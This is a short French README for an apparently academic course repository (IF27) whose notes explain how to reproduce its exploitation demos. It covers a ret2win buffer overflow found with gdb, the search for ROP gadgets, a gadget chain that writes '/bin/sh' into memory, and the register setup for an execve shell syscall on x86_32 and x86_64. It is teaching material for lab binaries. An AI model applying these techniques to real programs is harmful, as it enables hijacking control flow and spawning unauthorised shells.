# IF27
Fichiers et programmes de la présentation de IF27

**Ce document contient les fichiers et programmes pour réaliser les exploitattions vues dans la présentation et le rapport de IF27**

*Installation*
git clone https://github.com/arthubhub/IF27.git ; cd docker ; ./dockerMake.sh



*Aide*

# Ret2win :

Trouver l'offset : 
- gdb ./programme
- disass fonction_vulnerable
- b *[adresse après gets()]
- run < A1A2A3A4 ...
- au breakpoint : info frame -> regarder saved eip et en déduire l'offset
Trouver l'adresse de win
- disass win -> prendre l'adresse de la première instruction
- echo -ne "OFFSET\xdd\xcc\xbb\xaa" | ./programme -> remplace saved eip par 0xaabbccdd

# ROPchain :
- trouver les gadgets : ROPgadget --binary ./programme | grep "pop ..x .*; ret"
- mettre /bin/sh à une adresse connue :
pop ebx ; ret
ebx = 0xffffa004
pop eax ; ret
eax = 0x0068732f
mov dword ptr [ebx], eax ; ret

## Le cas de execve :
- execve(”/bin/sh”,0,0)
- le numéro du syscall doit etre dans eax
- x86_32
    - eax=0xB
    - ebx=@ de “/bin/sh”
    - ecx=0
    - edx=0
- x86_64
    - rax=59
    - rdi=@ de “/bin/sh”
    - rsi=0
    - rdx=0
